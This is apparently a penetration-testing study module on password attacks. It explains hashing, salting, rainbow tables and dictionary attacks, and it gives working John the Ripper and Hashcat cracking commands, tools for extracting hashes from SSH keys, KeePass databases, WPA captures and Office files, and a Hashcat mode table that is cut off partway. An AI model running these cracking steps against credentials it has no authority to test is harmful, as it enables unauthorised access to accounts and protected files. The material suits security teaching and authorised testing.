# 🔐 Password Attacks  
*Passwords remain the fragile seals guarding the gateways of corporate realms. When these wards are weak or neglected, the shadows may crack them open with ease. This module unveils the secrets of password storage, retrieval, and the arcane art of cracking or leveraging hashes—guiding the seeker through the labyrinth of authentication’s frailties.*

> *“Even the strongest lock may yield to the patient whisper of ancient incantations.”*

<details>
<summary><h1>Introduction</h1></summary>

Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker.

Hash functions are cryptographically designed to be one-way operations, making it computationally infeasible to derive the original input from its hashed output. When malicious actors attempt to reverse this process, it constitutes password cracking. Common methodologies include:

1. Rainbow Table Attacks

    * Leveraging precomputed hash chains for rapid lookups

2. Dictionary Attacks

    * Testing known wordlists and common password variations

3. Brute-Force Attacks

    * Systematic trial of all possible character combinations (typically last-resort)


<details>
<summary><h2>Generate a hash</h2></summary>

**MD5**

```bash
echo -n password123! | md5sum

# b7e283a09511d95d6eac86e39e7942c0
```

**SHA1**

```bash
echo -n "password123!" | sha1sum

# addbd3aa5619f2932733104eb8ceef08f6fd2693
```

**SHA256**

```bash
echo -n password123! | sha256sum

# 5751a44782594819e4cb8aa27c2c9d87a420af82bc6a5a05bc7f19c3bb00452b
```

**SHA512**

```bash
echo -n "password123!" | sha512sum

# 7d66f28d648ca474e357d78e9fbdeb9bbdb46e1603d4ec63f7affe217e6400f3f3211e6e4e1b29dc10617417e502b19c813ced4cec07360e7e3151c290388176
```

**CRC32**
```bash
echo -n "password123!" | gzip -1 | tail -c 8 | hexdump -n4 -e '"%08x\n"'

# 3cdccd7e
```

</details>

<details>
<summary><h2>Rainbow Tables</h2></summary>

Rainbow tables represent extensive pre-generated databases that map plaintext inputs to their corresponding hash outputs for specific cryptographic algorithms. These tables enable rapid password recovery through direct hash lookup.

| Password    | MD5 Hash                           |
|-------------|------------------------------------|
| 123456      | e10adc3949ba59abbe56e057f20f883e |
| 12345       | 827ccb0eea8a706c4c34a16891f84e7b |
| 123456789   | 25f9e794323b453885f5181f1b624d0b |
| password    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| iloveyou    | f25a2fc72690b780b2a14e140ef6a9e0 |
| princess    | 8afa847f50a716e64932d995c8e7435a |
| 1234567     | fcea920f7412b5da7be0cf42b8c93759 |
| rockyou     | f806fc5a2a0d5ba2471600758452799c |
| 12345678    | 25d55ad283aa400af464c76d713c07ad |
| abc123      | e99a18c428cb38d5f260853678922e03 |
| ...  | ...                        |

> Because rainbow tables are such a powerful attack, salting is used.

</details>

<details>
<summary><h2>Salt</h2></summary>

A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed.

For example, if the salt *PWN0M1C0N_* is prepended to the same password, the MD5 hash would now be as follows:

```bash
echo -n PWN0M1C0N_password123! | md5sum

# ded0e91215d34046aca709995c794045
```

**Why use a Salt?**

* Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.

* Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.

**How Salts Break Rainbow Tables**

A 1-byte salt (256 possible values) forces attackers to generate 256 versions of every precomputed hash. A rainbow table with 15 billion entries would need 3.84 trillion entries (15B × 256) to cover all salt combinations.
Modern Systems use larger salts (e.g., 16+ bytes), making rainbow tables computationally infeasible.

</details>

<details>
<summary><h2>Dictionary attack</h2></summary>

Dictionary attacks (or wordlist attacks) represent one of the most effective password cracking methods, particularly valuable for time-constrained engagements like penetration testing.

**Key Characteristics**

* **High Efficiency:** Targets common passwords first, maximizing success rate per attempt

* **Time Optimization:** Critical for engagements with limited testing windows

* **Customization:** Wordlists can be tailored to specific industries, regions, or targets

**Common Wordlist Resources**

* [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches

* [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:

    * Common credentials

    * Default passwords

    * Pattern-based variations

</details>

</details>

---

<details>
<summary><h1>Password Cracking Techniques</h1></summary>

<details>
<summary><h2>John The Ripper</h2></summary>

Tool used for cracking passwords through various attacks including brute-force and dictionary.

[Here](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) is a very useful cheat-sheet by PentestMonkey.

<details>
<summary><h3>JtR FOrmats</h3></summary>

| Hash Format           | Example Command                          | Description |
|-----------------------|-----------------------------------------|-------------|
| afs                   | `john --format=afs [...] <HASH_FILE>`    | AFS (Andrew File System) password hashes |
| bfegg                 | `john --format=bfegg [...] <HASH_FILE>`  | bfegg hashes used in Eggdrop IRC bots |
| bf                    | `john --format=bf [...] <HASH_FILE>`     | Blowfish-based crypt(3) hashes |
| bsdi                  | `john --format=bsdi [...] <HASH_FILE>`   | BSDi crypt(3) hashes |
| crypt(3)              | `john --format=crypt [...] <HASH_FILE>`  | Traditional Unix crypt(3) hashes |
| des                   | `john --format=des [...] <HASH_FILE>`    | Traditional DES-based crypt(3) hashes |
| dmd5                  | `john --format=dmd5 [...] <HASH_FILE>`   | DMD5 (Dragonfly BSD MD5) password hashes |
| dominosec             | `john --format=dominosec [...] <HASH_FILE>` | IBM Lotus Domino 6/7 password hashes |
| EPiServer SID hashes  | `john --format=episerver [...] <HASH_FILE>` | EPiServer SID (Security Identifier) password hashes |
| hdaa                  | `john --format=hdaa [...] <HASH_FILE>`   | hdaa password hashes used in Openwall GNU/Linux |
| hmac-md5              | `john --format=hmac-md5 [...] <HASH_FILE>` | hmac-md5 password hashes |
| hmailserver           | `john --format=hmailserver [...] <HASH_FILE>` | hmailserver password hashes |
| ipb2                  | `john --format=ipb2 [...] <HASH_FILE>`   | Invision Power Board 2 password hashes |
| krb4                  | `john --format=krb4 [...] <HASH_FILE>`   | Kerberos 4 password hashes |
| krb5                  | `john --format=krb5 [...] <HASH_FILE>`   | Kerberos 5 password hashes |
| LM                    | `john --format=LM [...] <HASH_FILE>`     | LM (Lan Manager) password hashes |
| lotus5                | `john --format=lotus5 [...] <HASH_FILE>` | Lotus Notes/Domino 5 password hashes |
| mscash                | `john --format=mscash [...] <HASH_FILE>` | MS Cache password hashes |
| mscash2               | `john --format=mscash2 [...] <HASH_FILE>` | MS Cache v2 password hashes |
| mschapv2              | `john --format=mschapv2 [...] <HASH_FILE>` | MS CHAP v2 password hashes |
| mskrb5                | `john --format=mskrb5 [...] <HASH_FILE>` | MS Kerberos 5 password hashes |
| mssql05               | `john --format=mssql05 [...] <HASH_FILE>` | MS SQL 2005 password hashes |
| mssql                 | `john --format=mssql [...] <HASH_FILE>`  | MS SQL password hashes |
| mysql-fast            | `john --format=mysql-fast [...] <HASH_FILE>` | MySQL fast password hashes |
| mysql                 | `john --format=mysql [...] <HASH_FILE>`  | MySQL password hashes |
| mysql-sha1            | `john --format=mysql-sha1 [...] <HASH_FILE>` | MySQL SHA1 password hashes |
| NETLM                 | `john --format=netlm [...] <HASH_FILE>`  | NETLM (NT LAN Manager) password hashes |
| NETLMv2               | `john --format=netlmv2 [...] <HASH_FILE>` | NETLMv2 (NT LAN Manager version 2) password hashes |
| NETNTLM               | `john --format=netntlm [...] <HASH_FILE>` | NETNTLM (NT LAN Manager) password hashes |
| NETNTLMv2             | `john --format=netntlmv2 [...] <HASH_FILE>` | NETNTLMv2 (NT LAN Manager version 2) password hashes |
| NEThalfLM             | `john --format=nethalflm [...] <HASH_FILE>` | NEThalfLM (NT LAN Manager) password hashes |
| md5ns                 | `john --format=md5ns [...] <HASH_FILE>`  | md5ns (MD5 namespace) password hashes |
| nsldap                | `john --format=nsldap [...] <HASH_FILE>` | nsldap (OpenLDAP SHA) password hashes |
| ssha                  | `john --format=ssha [...] <HASH_FILE>`   | ssha (Salted SHA) password hashes |
| NT                    | `john --format=nt [...] <HASH_FILE>`     | NT (Windows NT) password hashes |
| openssha              | `john --format=openssha [...] <HASH_FILE>` | OPENSSH private key password hashes |
| oracle11              | `john --format=oracle11 [...] <HASH_FILE>` | Oracle 11 password hashes |
| oracle                | `john --format=oracle [...] <HASH_FILE>` | Oracle password hashes |
| pdf                   | `john --format=pdf [...] <HASH_FILE>`    | PDF (Portable Document Format) password hashes |
| phpass-md5            | `john --format=phpass-md5 [...] <HASH_FILE>` | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                  | `john --format=phps [...] <HASH_FILE>`   | PHPS password hashes |
| pix-md5               | `john --format=pix-md5 [...] <HASH_FILE>` | Cisco PIX MD5 password hashes |
| po                    | `john --format=po [...] <HASH_FILE>`     | Po (Sybase SQL Anywhere) password hashes |
| rar                   | `john --format=rar [...] <HASH_FILE>`    | RAR (WinRAR) password hashes |
| raw-md4               | `john --format=raw-md4 [...] <HASH_FILE>` | Raw MD4 password hashes |
| raw-md5               | `john --format=raw-md5 [...] <HASH_FILE>` | Raw MD5 password hashes |
| raw-md5-unicode       | `john --format=raw-md5-unicode [...] <HASH_FILE>` | Raw MD5 Unicode password hashes |
| raw-sha1              | `john --format=raw-sha1 [...] <HASH_FILE>` | Raw SHA1 password hashes |
| raw-sha224            | `john --format=raw-sha224 [...] <HASH_FILE>` | Raw SHA224 password hashes |
| raw-sha256            | `john --format=raw-sha256 [...] <HASH_FILE>` | Raw SHA256 password hashes |
| raw-sha384            | `john --format=raw-sha384 [...] <HASH_FILE>` | Raw SHA384 password hashes |
| raw-sha512            | `john --format=raw-sha512 [...] <HASH_FILE>` | Raw SHA512 password hashes |
| salted-sha            | `john --format=salted-sha [...] <HASH_FILE>` | Salted SHA password hashes |
| sapb                  | `john --format=sapb [...] <HASH_FILE>`   | SAP CODVN B (BCODE) password hashes |
| sapg                  | `john --format=sapg [...] <HASH_FILE>`   | SAP CODVN G (PASSCODE) password hashes |
| sha1-gen              | `john --format=sha1-gen [...] <HASH_FILE>` | Generic SHA1 password hashes |
| skey                  | `john --format=skey [...] <HASH_FILE>`   | S/Key (One-time password) hashes |
| ssh                   | `john --format=ssh [...] <HASH_FILE>`    | SSH (Secure Shell) password hashes |
| sybasease             | `john --format=sybasease [...] <HASH_FILE>` | Sybase ASE password hashes |
| xsha                  | `john --format=xsha [...] <HASH_FILE>`   | xsha (Extended SHA) password hashes |
| zip                   | `john --format=zip [...] <HASH_FILE>`    | ZIP (WinZip) password hashes |

</details>

<details>
<summary><h3>Cracking passwords</h3></summary>

<details>
<summary><h4>Wordlists</h4></summary>

Verify the hash type

```bash
hashid -j "<HASH_STRING>"
```

> By adding the -j flag, hashID will, in addition to the hash format, list the corresponding JtR format

Create the hash file

```bash
echo "<HASH_STRING>" > hash.txt
```

> To process multiple hashes in a single operation, place each hash on a separate line and ensure no empty lines or extraneous characters.

Example valid format

```bash
d1c5c8f3b5f1e0a7a6b8d9c2e4f6a3b1d0e7f8c9  
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  
7c4a8d09ca3762af61e59520943dc26494f8941b
```

Run john

```bash
john --format=<HASH_FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt > cracked_hash.txt
```

Verify the results

```bash
john --show --format=raw-md5 hash.txt
```

</details>

<details>
<summary><h4>Single</h4></summary>

Verify the hash type

```bash
hashid -j "<HASH_STRING>"
```

Create the hash file

```bash
echo "<HASH_STRING>" > hash.txt
```

Example valid format

```bash
r0lf:\$6\$ues25dIanlctrWxg\$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```

Run john

```bash
john --single --format=<HASH_FORMAT> hash.txt
```

Verify the results

```bash
john --show --format=<HASH_FORMAT> hash.txt
```

</details>

</details>

<details>
<summary><h3>Cracking files</h3></summary>

John the Ripper includes specialized utilities for extracting hashes from encrypted/password-protected files. These companion tools follow a consistent syntax pattern:

```bash
<TOOL> <FILE_TO_CRACK> > file.hash
```

Some of the tools included with JtR are:

| Tool                     | Example Usage                     | Description |
|--------------------------|-----------------------------------|-------------|
| `pdf2john`               | `pdf2john file.pdf > hash.txt`    | Extracts password hashes from PDF files for John |
| `ssh2john`               | `ssh2john id_rsa > hash.txt`      | Converts SSH private keys to John format |
| `mscash2john`            | `mscash2john cache.dat > hash.txt`| Extracts MS Cash password hashes |
| `keychain2john`          | `keychain2john login.keychain > hash.txt` | Processes macOS keychain files |
| `rar2john`               | `rar2john archive.rar > hash.txt` | Extracts RAR archive passwords |
| `pfx2john`               | `pfx2john cert.pfx > hash.txt`    | Converts PKCS#12 files for cracking |
| `truecrypt_volume2john`  | `truecrypt_volume2john volume.tc > hash.txt` | Extracts TrueCrypt volume passwords |
| `keepass2john`           | `keepass2john database.kdbx > hash.txt` | Extracts KeePass database credentials |
| `vncpcap2john`           | `vncpcap2john capture.pcap > hash.txt` | Extracts VNC passwords from PCAP files |
| `putty2john`             | `putty2john putty_key.ppk > hash.txt` | Converts PuTTY private keys |
| `zip2john`               | `zip2john archive.zip > hash.txt` | Extracts ZIP archive passwords |
| `hccap2john`             | `hccap2john capture.cap > hash.txt` | Converts WPA handshakes for cracking |
| `office2john`            | `office2john document.docx > hash.txt` | Extracts MS Office document passwords |
| `wpa2john`               | `wpa2john capture.pcap > hash.txt` | Alternative WPA handshake converter |

An even larger collection can be found:

```bash
locate *2john*
```

</details>

</details>

<details>
<summary><h2>Hashcat</h2></summary>

Hashcat is a well-known password cracking tool for Linux, Windows, and macOS.

```bash
hashcat --attack-mode 0 --hash-type <HASHCAT_HASH_TYPE> <HASH_FILE> <WORDLIST>
```

To find more information about Hashcat, use:

```bash
hashcat --help
```

Hashid can be used to identify the hashcat has type

```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

Expected output

```bash
# Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

# [+] MD5 Crypt [Hashcat Mode: 500]
# [+] Cisco-IOS(MD5) [Hashcat Mode: 500]
# [+] FreeBSD MD5 [Hashcat Mode: 500]
```

<details>
<summary><h3>Attack modes</h3></summary>

<details>
<summary><h4>Dictionary Attack</h4></summary>

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> <WORDLIST>
```

Example

```bash
hashcat --attack-mode 0 --hash-type 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

</details>

<details>
<summary><h4>Dictionary Attack + Rules</h4></summary>

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> <WORDLIST> --rules-file <RULE_FILE>
```

Example

```bash
hashcat --attack-mode 0 --hash-type 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```

</details>

<details>
<summary><h4>Mask attack</h4></summary>

If we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> '<MASK>'
```

Example

```bash
hashcat --attack-mode 3 --hash-type 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

</details>

</details>

<details>
<summary><h3>Hashcat types</h3></summary>

|   # | Name                                                                 | Category                              |
|-----:|----------------------------------------------------------------------|---------------------------------------|
|  900 | MD4                                                                  | Raw Hash                              |
|    0 | MD5                                                                  | Raw Hash                              |
|  100 | SHA1                                                                 | Raw Hash                              |
| 1300 | SHA2-224                                                             | Raw Hash                              |
| 1400 | SHA2-256                                                             | Raw Hash                              |
| 10800 | SHA2-384                                                             | Raw Hash                              |
| 1700 | SHA2-512                                                             | Raw Hash                              |
| 17300 | SHA3-224                                                             | Raw Hash                              |
| 17400 | SHA3-256                                                             | Raw Hash                              |
| 17500 | SHA3-384                                                             | Raw Hash                              |
| 17600 | SHA3-512                                                             | Raw Hash                              |
| 6000 | RIPEMD-160                                                           | Raw Hash                              |
|  600 | BLAKE2b-512                                                          | Raw Hash                              |
| 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian                     | Raw Hash                              |
| 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian                     | Raw Hash                              |
| 6900 | GOST R 34.11-94                                                      | Raw Hash                              |
| 17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                                 | Raw Hash                              |
| 5100 | Half MD5                                                             | Raw Hash                              |
| 17700 | Keccak-224                                                           | Raw Hash                              |
| 17800 | Keccak-256                                                           | Raw Hash                              |
| 17900 | Keccak-384                                                           | Raw Hash                              |
| 18000 | Keccak-512                                                           | Raw Hash                              |
| 6100 | Whirlpool                                                            | Raw Hash                              |
| 10100 | SipHash                                                              | Raw Hash                              |
|   70 | md5(utf16le($pass))                                                  | Raw Hash                              |
|  170 | sha1(utf16le($pass))                                                 | Raw Hash                              |
| 1470 | sha256(utf16le($pass))                                               | Raw Hash                              |
| 10870 | sha384(utf16le($pass))                                               | Raw Hash                              |
| 1770 | sha512(utf16le($pass))                                               | Raw Hash                              |
|  610 | BLAKE2b-512($pass.$salt)                                             | Raw Hash salted and/or iterated       |
|  620 | BLAKE2b-512($salt.$pass)                                             | Raw Hash salted and/or iterated       |
|   10 | md5($pass.$salt)                                                     | Raw Hash salted and/or iterated       |
|   20 | md5($salt.$pass)                                                     | Raw Hash salted and/or iterated       |
| 3800 | md5($salt.$pass.$salt)                                               | Raw Hash salted and/or iterated       |
| 3710 | md5($salt.md5($pass))                                                | Raw Hash salted and/or iterated       |
| 4110 | md5($salt.md5($pass.$salt))                                          | Raw Hash salted and/or iterated       |
| 4010 | md5($salt.md5($salt.$pass))                                          | Raw Hash salted and/or iterated       |
| 21300 | md5($salt.sha1($salt.$pass))                                         | Raw Hash salted and/or iterated       |
|   40 | md5($salt.utf16le($pass))                                            | Raw Hash salted and/or iterated       |
| 2600 | md5(md5($pass))                                                      | Raw Hash salted and/or iterated       |
| 3910 | md5(md5($pass).md5($salt))                                           | Raw Hash salted and/or iterated       |
| 3500 | md5(md5(md5($pass)))                                                 | Raw Hash salted and/or iterated       |
| 4400 | md5(sha1($pass))                                                     | Raw Hash salted and/or iterated       |
| 4410 | md5(sha1($pass).$salt)                                               | Raw Hash salted and/or iterated       |
| 20900 | md5(sha1($pass).md5($pass).sha1($pass))                              | Raw Hash salted and/or iterated       |
| 21200 | md5(sha1($salt).md5($pass))                                          | Raw Hash salted and/or iterated       |
| 4300 | md5(strtoupper(md5($pass)))                                          | Raw Hash salted and/or iterated       |
|   30 | md5(utf16le($pass).$salt)                                            | Raw Hash salted and/or iterated       |
|  110 | sha1($pass.$salt)                                                    | Raw Hash salted and/or iterated       |
|  120 | sha1($salt.$pass)                                                    | Raw Hash salted and/or iterated       |
| 4900 | sha1($salt.$pass.$salt)                                              | Raw Hash salted and/or iterated       |
| 4520 | sha1($salt.sha1($pass))                                              | Raw Hash salted and/or iterated       |
| 24300 | sha1($salt.sha1($pass.$salt))                                        | Raw Hash salted and/or iterated       |
|  140 | sha1($salt.utf16le($pass))                                           | Raw Hash salted and/or iterated       |
| 19300 | sha1($salt1.$pass.$salt2)                                            | Raw Hash salted and/or iterated       |
| 14400 | sha1(CX)                                                             | Raw Hash salted and/or iterated       |
| 4700 | sha1(md5($pass))                                                     | Raw Hash salted and/or iterated       |
| 4710 | sha1(md5($pass).$salt)                                               | Raw Hash salted and/or iterated       |
| 21100 | sha1(md5($pass.$salt))                                               | Raw Hash salted and/or iterated       |
| 18500 | sha1(md5(md5($pass)))                                                | Raw Hash salted and/or iterated       |
| 4500 | sha1(sha1($pass))                                                    | Raw Hash salted and/or iterated       |
| 4510 | sha1(sha1($pass).$salt)                                              | Raw Hash salted and/or iterated       |
| 5000 | sha1(sha1($salt.$pass.$salt))                                        | Raw Hash salted and/or iterated       |
|  130 | sha1(utf16le($pass).$salt)                                           | Raw Hash salted and/or iterated       |
| 1410 | sha256($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 1420 | sha256($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 22300 | sha256($salt.$pass.$salt)                                            | Raw Hash salted and/or iterated       |
| 20720 | sha256($salt.sha256($pass))                                          | Raw Hash salted and/or iterated       |
| 21420 | sha256($salt.sha256_bin($pass))                                      | Raw Hash salted and/or iterated       |
| 1440 | sha256($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 20800 | sha256(md5($pass))                                                   | Raw Hash salted and/or iterated       |
| 20710 | sha256(sha256($pass).$salt)                                          | Raw Hash salted and/or iterated       |
| 21400 | sha256(sha256_bin($pass))                                            | Raw Hash salted and/or iterated       |
| 1430 | sha256(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
| 10810 | sha384($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 10820 | sha384($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 10840 | sha384($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 10830 | sha384(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
| 1710 | sha512($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 1720 | sha512($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 1740 | sha512($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 1730 | sha512(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
|   50 | HMAC-MD5 (key = $pass)                                              | Raw Hash authenticated                |
|   60 | HMAC-MD5 (key = $salt)                                              | Raw Hash authenticated                |
|  150 | HMAC-SHA1 (key = $pass)                                             | Raw Hash authenticated                |
|  160 | HMAC-SHA1 (key = $salt)                                             | Raw Hash authenticated                |
| 1450 | HMAC-SHA256 (key = $pass)                                           | Raw Hash authenticated                |
| 1460 | HMAC-SHA256 (key = $salt)                                           | Raw Hash authenticated                |
| 1750 | HMAC-SHA512 (key = $pass)                                           | Raw Hash authenticated                |
| 1760 | HMAC-SHA512 (key = $salt)                                           | Raw Hash authenticated                |
| 11750 | HMAC-Streebog-256 (key = $pass), big-endian                          | Raw Hash authenticated                |
| 11760 | HMAC-Streebog-256 (key = $salt), big-endian                          | Raw Hash authenticated                |
| 11850 | HMAC-Streebog-512 (key = $pass), big-endian                          | Raw Hash authenticated                |
| 11860 | HMAC-Streebog-512 (key = $salt), big-endian                          | Raw Hash authenticated                |
| 28700 | Amazon AWS4-HMAC-SHA256                                              | Raw Hash authenticated                |
| 11500 | CRC32                                                                | Raw Checksum                          |
| 27900 | CRC32C                                                               | Raw Checksum                          |
| 28000 | CRC64Jones                                                           | Raw Checksum                          |
| 18700 | Java Object hashCode()                                               | Raw Checksum                          |
| 25700 | MurmurHash                                                           | Raw Checksum                          |
| 27800 | MurmurHash3                                                          | Raw Checksum                          |
| 14100 | 3DES (PT = $salt, key = $pass)                                      | Raw Cipher, Known-plaintext attack    |
| 14000 | DES (PT = $salt, key = $pass)                                       | Raw Cipher, Known-plaintext attack    |
| 26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 15400 | ChaCha20                                                             | Raw Cipher, Known-plaintext attack    |
| 14500 | Linux Kernel Crypto API (2.4)                                        | Raw Cipher, Known-plaintext attack    |
| 14900 | Skip32 (PT = $salt, key = $pass)                                    | Raw Cipher, Known-plaintext attack    |
| 11900 | PBKDF2-HMAC-MD5                                                      | Generic KDF                           |
| 12000 | PBKDF2-HMAC-SHA1                                                     | Generic KDF                           |
| 10900 | PBKDF2-HMAC-SHA256                                                   | Generic KDF                           |
| 12100 | PBKDF2-HMAC-SHA512                                                   | Generic KDF                           |
| 8900 | scrypt                                                               | Generic KDF                           |
|  400 | phpass                                                               | Generic KDF                           |
| 16100 | TACACS+                                                              | Network Protocol                      |
| 11400 | SIP digest authentication (MD5)                                      | Network Protocol                      |
| 5300 | IKE-PSK MD5                                                          | Network Protocol                      |
| 5400 | IKE-PSK SHA1                                                         | Network Protocol                      |
| 25100 | SNMPv3 HMAC-MD5-96                                                   | Network Protocol                      |
| 25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                                      | Network Protocol                      |
| 25200 | SNMPv3 HMAC-SHA1-96                                                  | Network Protocol                      |
| 26700 | SNMPv3 HMAC-SHA224-128                                               | Network Protocol                      |
| 26800 | SNMPv3 HMAC-SHA256-192                                               | Network Protocol                      |
| 26900 | SNMPv3 HMAC-SHA384-256                                               | Network Protocol                      |
| 27300 | SNMPv3 HMAC-SHA512-384                                               | Network Protocol                      |
| 2500 | WPA-EAPOL-PBKDF2                                                     | Network Protocol                      |
| 2501 | WPA-EAPOL-PMK                                                        | Network Protocol                      |
| 22000 | WPA-PBKDF2-PMKID+EAPOL                                               | Network Protocol                      |
| 22001 | WPA-PMK-PMKID+EAPOL                                                  | Network Protocol                      |
| 16800 | WPA-PMKID-PBKDF2                                                     | Network Protocol                      |
| 16801 | WPA-PMKID-PMK                                                        | Network Protocol                      |
| 7300 | IPMI2 RAKP HMAC-SHA1                                                 | Network Protocol                      |
| 10200 | CRAM-MD5                                                             | Network Protocol                      |
| 16500 | JWT (JSON Web Token)                                                 | Network Protocol                      |
| 29200 | Radmin3                                                              | Network Protocol                      |
| 19600 | Kerberos 5, etype 17, TGS-REP                                        | Network Protocol                      |
| 19800 | Kerberos 5, etype 17, Pre-Auth                                       | Network Protocol                      |
| 28800 | Kerberos 5, etype 17, DB                                             | Network Protocol                      |
| 19700 | Kerberos 5, etype 18, TGS-REP                                        | Network Protocol                      |
| 19900 | Kerberos 5, etype 18, Pre-Auth                                       | Network Protocol                      |
| 28900 | Kerberos 5, etype 18, DB                                             | Network Protocol                      |
| 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                                | Network Protocol                      |
| 13100 | Kerberos 5, etype 23, TGS-REP                                        | Network Protocol                      |
| 18200 | Kerberos 5, etype 23, AS-REP                                         | Network Protocol                      |
| 5500 | NetNTLMv1 / NetNTLMv1+ESS                                            | Network Protocol                      |
| 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                                       | Network Protocol                      |
| 5600 | NetNTLMv2                                                            | Network Protocol                      |
| 27100 | NetNTLMv2 (NT)                                                       | Network Protocol                      |
| 29100 | Flask Session Cookie ($salt.$salt.$pass)                             | Network Protocol                      |
| 4800 | iSCSI CHAP authentication, MD5(CHAP)                                 | Network Protocol                      |
| 8500 | RACF                                                                 | Operating System                      |
| 6300 | AIX {smd5}                                                           | Operating System                      |
| 6700 | AIX {ssha1}                                                          | Operating System                      |
| 6400 | AIX {ssha256}                                                        | Operating System                      |
| 6500 | AIX {ssha512}                                                        | Operating System                      |
| 3000 | LM                                                                   | Operating System                      |
| 19000 | QNX /etc/shadow (MD5)                                                | Operating System                      |
| 19100 | QNX /etc/shadow (SHA256)                                             | Operating System                      |
| 19200 | QNX /etc/shadow (SHA512)                                             | Operating System                      |
| 15300 | DPAPI masterkey file v1 (context 1 and 2)                            | Operating System                      |
| 15310 | DPAPI masterkey file v1 (context 3)                                  | Operating System                      |
| 15900 | DPAPI masterkey file v2 (context 1 and 2)                            | Operating System                      |
| 15910 | DPAPI masterkey file v2 (context 3)                                  | Operating System                      |
| 7200 | GRUB 2                                                               | Operating System                      |
| 12800 | MS-AzureSync PBKDF2-HMAC-SHA256                                      | Operating System                      |
| 12400 | BSDi Crypt, Extended DES                                             | Operating System                      |
| 1000 | NTLM                                                                 | Operating System                      |
| 9900 | Radmin2                                                              | Operating System                      |
| 5800 | Samsung Android Password/PIN                                         | Operating System                      |
| 28100 | Windows Hello PIN/Password                                           | Operating System                      |
| 13800 | Windows Phone 8+ PIN/password                                        | Operating System                      |
| 2410 | Cisco-ASA MD5                                                        | Operating System                      |
| 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                                        | Operating System                      |
| 9300 | Cisco-IOS $9$ (scrypt)                                               | Operating System                      |
| 5700 | Cisco-IOS type 4 (SHA256)                                            | Operating System                      |
| 2400 | Cisco-PIX MD5                                                        | Operating System                      |
| 8100 | Citrix NetScaler (SHA1)                                              | Operating System                      |
| 22200 | Citrix NetScaler (SHA512)                                            | Operating System                      |
| 1100 | Domain Cached Credentials (DCC), MS Cache                            | Operating System                      |
| 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2                       | Operating System                      |
| 7000 | FortiGate (FortiOS)                                                  | Operating System                      |
| 26300 | FortiGate256 (FortiOS256)                                            | Operating System                      |
|  125 | ArubaOS                                                              | Operating System                      |
|  501 | Juniper IVE                                                          | Operating System                      |
|   22 | Juniper NetScreen/SSG (ScreenOS)                                     | Operating System                      |
| 15100 | Juniper/NetBSD sha1crypt                                             | Operating System                      |
| 26500 | iPhone passcode (UID key + System Keybag)                            | Operating System                      |
|  122 | macOS v10.4, macOS v10.5, macOS v10.6                                | Operating System                      |
| 1722 | macOS v10.7                                                          | Operating System                      |
| 7100 | macOS v10.8+ (PBKDF2-SHA512)                                         | Operating System                      |
| 3200 | bcrypt $2*$, Blowfish (Unix)                                         | Operating System                      |
|  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                            | Operating System                      |
| 1500 | descrypt, DES (Unix), Traditional DES                                | Operating System                      |
| 29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))              | Operating System                      |
| 7400 | sha256crypt $5$, SHA256 (Unix)                                       | Operating System                      |
| 1800 | sha512crypt $6$, SHA512 (Unix)                                       | Operating System                      |
| 24600 | SQLCipher                                                            | Database Server                       |
|  131 | MSSQL (2000)                                                         | Database Server                       |
|  132 | MSSQL (2005)                                                         | Database Server                       |
| 1731 | MSSQL (2012, 2014)                                                   | Database Server                       |
